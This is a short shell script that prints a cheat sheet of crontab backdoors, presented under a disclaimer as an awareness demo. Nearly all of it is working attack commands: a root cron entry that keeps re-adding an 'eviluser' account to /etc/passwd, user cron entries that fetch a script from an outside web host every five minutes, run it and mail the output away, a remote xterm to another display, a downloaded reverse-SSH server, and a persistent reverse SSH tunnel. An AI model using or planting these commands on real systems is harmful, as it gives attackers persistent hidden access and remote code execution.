#!/bin/sh
## very very naughty
## Disclaimer: Released so that people can be aware of just how easy it is for a naughty hacker to backdoor them if they leave their computer unlocked in an untrusted environment.
## If you experiment with these backdoors, please don't use my webserver and email address!
## You'll find that you can easily spot these types of backdoor in your crontab (they are not well hidden).

SSH_TUNNEL_COMMAND="ssh -R 8922:localhost:22 joey@neuralyte.org sleep 24h"

cat << !!

### As root:

## Create a user account and keep it alive!
( crontab -l ; echo '* * * * * grep eviluser /etc/passwd || echo "eviluser:x:1234:1234:x,,,:/tmp:/bin/bash" >> /etc/passwd 2>/dev/null > /dev/null' ) | crontab -


### As user:

## Every 5 minutes, collect a shellscript from a webserver, run it, and mail the results back.
( crontab -l ; echo '*/5 * * * * wget -O - http://hwi.ath.cx/dome.sh 2>/dev/null | sh 2>&1 | mail joey@hwi.ath.cx 2>/dev/null > /dev/null' ) | crontab -

## Every hour, provide an xterm to somebody else's display.
( crontab -l ; echo '00 * * * * env DISPLAY=mybox:0 xterm 2>/dev/null > /dev/null &' ) | crontab -

## Every hour, try to initialise a revssh session.
( crontab -l ; echo '00 * * * * wget -nv http://hwi.ath.cx/jshtools/revsshserver -O - | sh -s -- -check 2>/dev/null > /dev/null &' ) | crontab -

## Or:
wget -nv -O ~/.revssh http://hwi.ath.cx/jshtools/revsshserver
( crontab -l ; echo '00 * * * * sh ~/.revssh -check 2>/dev/null > /dev/null &' ) | crontab -

## If you have already run "ssh-keygen -t dsa", and copied your public key to the remote machine, you can create a persistent reverse tunnel like this:
# ( crontab -l ; echo '00 06 * * * $SSH_TUNNEL_COMMAND 2>/dev/null >/dev/null' ) | crontab -
( crontab -l ; echo '00 06 * * * ps -u | grep "$SSH_TUNNEL_COMMAND" 2>&1 >/dev/null || $SSH_TUNNEL_COMMAND 2>/dev/null >/dev/null' ) | crontab -
## BUG TODO: this hasn't actually been working for me, but I have an implementation where cron runs a shellscript which works.

!!

